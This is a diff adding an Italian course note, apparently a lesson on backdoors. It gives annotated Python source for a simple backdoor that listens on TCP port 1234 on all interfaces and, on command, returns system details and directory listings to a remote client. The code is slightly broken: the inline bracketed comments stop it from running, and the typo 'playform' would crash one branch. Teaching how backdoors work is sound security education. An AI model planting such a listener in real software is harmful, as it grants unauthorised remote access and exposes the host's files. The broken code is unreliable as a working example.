@@ -1,0 +1,74 @@
+S3L4
+
+Una backdoor è un metodo per aggirare un normale sistema di autenticazione, programmato all'interno di un programma in modo che possa segretamente garantire il controllo.
+
+
+import socket, platform, os [Importa i moduli necessari]
+
+
+
+SRV_ADDR = "" [Il campo vuoto indica che ascolterà da tutte le interfacce di rete contemporaneamente.]
+
+SRV_PORT = 1234
+
+
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) [Creazione del socket]
+
+s.bind((SRV_ADDR, SRV_PORT)) [Assegna i valori indicati prima]
+
+s.listen(1) [Mette il socket in ascolto e limita le connessioni a 1]
+
+connection, address = s.accept() [Attende una connessione]
+
+
+
+print("client connected: ", address) [Mostra l'indirizzo a cui ci si è connessi]
+
+
+
+while 1: [Questo loop non terminerà]
+
+	try:
+
+		data = connection.recv(1024) [Ricezione dei dati a blocchi di 1024 byte]
+
+	except:continue [Se non riceve dati, continua.]
+
+
+
+	if(data.decode('utf-8') == '1'):	[Se riceve un 1, invia le informazioni della macchina.]
+
+		tosend = platform.platform() + " " + playform.machine()
+
+		connection.sendall(tosend.encode()) [Invia i dati]
+
+	elif(data.decode('utf-8') == '2'): [Se riceve un 2, prova a mostrare i file nella directory.]
+
+		data = connection.recv(1024)
+
+		try:
+
+			filelist = os.listdir(data.decode('utf-8'))
+
+			tosend = ""
+
+			for x in filelist:
+
+				tosend += "," + x
+
+		
+
+		except:
+
+			tosend = "Wrong path" [In caso di accesso errato/negato]
+
+		connection.sendall(tosend.encode())
+
+	elif(data.decode('utf-8') == '0'): [Chiudi la connessione se riceve uno 0]
+
+		connection.close()
+
+		connection, address = s.accept()
+
+	
